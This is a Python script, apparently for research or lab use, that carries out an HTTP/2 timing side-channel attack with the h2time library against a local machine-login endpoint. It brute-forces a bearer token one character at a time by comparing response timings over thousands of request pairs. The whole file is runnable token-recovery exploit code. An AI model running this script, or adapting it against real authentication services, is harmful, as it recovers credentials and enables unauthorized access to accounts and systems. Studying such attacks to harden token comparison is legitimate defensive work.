from h2time import H2Time, H2Request
import asyncio
import string
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger('research')

async def create_auth_request(token: str) -> H2Request:
    """Create an H2Request with the specified Authorization token."""
    return H2Request(
        method="GET",
        url="http://localhost:8888/auth/machine/login",
        headers={
            "Authorization": f"Bearer {token}",
            "User-Agent": "h2time/0.1"
        }
    )

async def perform_timing_attack(token_prefix: str, char_set: str = string.digits + string.ascii_uppercase) -> str:
    """Perform a timing attack to find the next character in the token."""
    best_char = None
    best_score = float('-inf')
    
    for char in char_set:
        test_token = token_prefix + char
        r1 = await create_auth_request(test_token)
        r2 = await create_auth_request(test_token + "x")  # Control request with invalid next char
        
        logger.info(f"Testing character: {char}")
        async with H2Time(r1, r2, num_request_pairs=1000, sequential=True) as h2t:
            results = await h2t.run_attack()
            if results:
                # Calculate average timing difference
                avg_diff = sum(r[1] - r[0] for r in results) / len(results)
                if avg_diff > best_score:
                    best_score = avg_diff
                    best_char = char
                    logger.info(f"New best character: {char} with score {avg_diff}")
    
    return best_char

async def find_token() -> str:
    """Find the complete token using timing attacks."""
    token = ""
    while True:
        next_char = await perform_timing_attack(token)
        if not next_char:
            break
        token += next_char
        print(f"Found token so far: {token}")
    return token

if __name__ == "__main__":
    try:
        asyncio.run(find_token())
    except KeyboardInterrupt:
        logger.info("Interrupted by user")


